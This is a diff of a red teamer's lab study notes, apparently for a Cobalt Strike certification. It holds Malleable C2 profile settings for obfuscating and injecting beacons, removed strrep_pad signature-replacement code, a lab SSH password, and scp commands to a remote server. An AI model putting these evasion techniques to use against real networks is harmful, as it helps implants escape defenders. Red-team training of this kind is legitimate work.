@@ -326,7 +326,7 @@ The beacons of these listeners don’t need to talk to the C2 directly, they can
 
 # NextSteps
 
-- [ ] Tester avec full Crystal-Kit last version github sur les labs
+- [x] Tester avec full Crystal-Kit last version github sur les labs
 - [x] Faire un nouveau shellcode runner (process hollowing ou APC en .NET), le tester en condition réelle sur la VM avec service csvc.exe et ysoserial
 - [x] Tester dans le lab les exploits mssql avec beacon smb/tcp listener avec connect/link
 - [x] Relire les 4 points perdus et chercher ce qui a pu causer ces erreurs
@@ -337,21 +337,46 @@ The beacons of these listeners don’t need to talk to the C2 directly, they can
 - Beacon smb/tcp -> link/connect
 
 
-# Preperation
-- `scp root@157.90.29.76:/tmp/Crystal-Kit-main.zip C:\Tools\`
-- Faire toutes les modifs dans crystalkit.cna (strrep_pad)
-
-Inside the **BEACON_RDLL_GENERATE** hook, insert the following code after the "x86 warning":
+# Préparation
+1. SSH into the Team Server VM if needed.
+    1. `ssh attacker@10.0.0.5`
+    2. The password is `Passw0rd!`.
+2. Open the default profile.
+    1. `vim /opt/cobaltstrike/profiles/default.profile`
 ```
-# replace some common strings
-$beacon = strrep_pad ( $beacon, "beacon.x64.dll", "bacon.x64.dll" );
-$beacon = strrep_pad ( $beacon, "%02d/%02d/%02d", "%02d/%02d/%04d" );
-$beacon = strrep_pad ( $beacon, "%s as %s\%s: %d", "%s - %s\%s (%d)" );
-$beacon = strrep_pad ( $beacon, "\x48\x89\x5C\x24\x08\x57\x48\x83\xEC\x20\x48\x8B\x59\x10\x48\x8B\xF9\x48\x8B\x49\x08\xFF\x17\x33\xD2\x41\xB8\x00\x80\x00\x00", "\x48\x89\x5C\x24\x08\x57\x48\x83\xEC\x20\x48\x8B\x59\x10\x48\x8B\xF9\x48\x8B\x49\x08\xFF\x17\x33\xD2\x41\xB8\x01\x80\x00\x00" );
-```
+stage {
+    set sleep_mask "false";
+    set cleanup "true";
+    transform-obfuscate { }
+}
 
+post-ex {
+	set cleanup "true";
+}
+
+process-inject {
+	set startrwx "false";
+	set userwx "false";
+	execute {
+		ObfSetThreadContext "ntdll.dll!RtlUserThreadStart+0x2c";
+		CreateRemoteThread "ntdll!TppWorkerThread+0x37e";
+		SetThreadContext;
+		RtlCreateUserThread;
+	}
+}
+```
+```bash
+sudo /usr/bin/docker restart cobalt
+```
+`scp -r C:\Tools\Crystal-Kit\ root@157.90.29.76:/tmp/Crystal-Kit-CRTL`
+
+**Crystal-Kit-CRTL**
+- `scp root@157.90.29.76:/tmp/Crystal-Kit-CRTL/ C:\Tools\`
+- Load `C:\Tools\Crystal-Kit-CRTL\crystalkit.cna`
+
+**Crystal-Kit-main (GitHub)**
+- `scp root@157.90.29.76:/tmp/Crystal-Kit-main/ C:\Tools\`
 - Load `C:\Tools\Crystal-Kit-main\crystalkit.cna`
-
 # Feedback score
 
 **Cobalt Strike in memory** — Tes chaînes caractéristiques du beacon (named pipes, commandes, metadata) sont probablement restées en clair en mémoire. Le feedback le confirme : il te manque du string replacement dans le profil Malleable C2 et une technique de sleep obfuscation (sleep mask kit ou équivalent) pour chiffrer le beacon entre les callbacks.
